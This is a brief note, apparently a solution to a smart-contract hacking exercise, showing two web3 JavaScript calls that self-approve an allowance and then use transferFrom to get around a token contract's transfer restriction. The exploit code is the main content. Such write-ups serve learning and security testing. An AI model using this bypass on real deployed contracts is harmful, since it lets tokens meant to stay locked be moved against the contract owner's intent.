```javascript
await contract.methods['approve(address,uint256)']("--my-address--", "1000000000000000000000000");
await contract.methods['transferFrom(address,address,uint256)']("--my-address--", "--other-address--", "1000000000000000000000000")
```

The code is only overriding one of the transfer methods, hence
**transferFrom** can still be called after giving an allowance
to ourselves. Was surprised to see that allowance is needed for
the owner address too.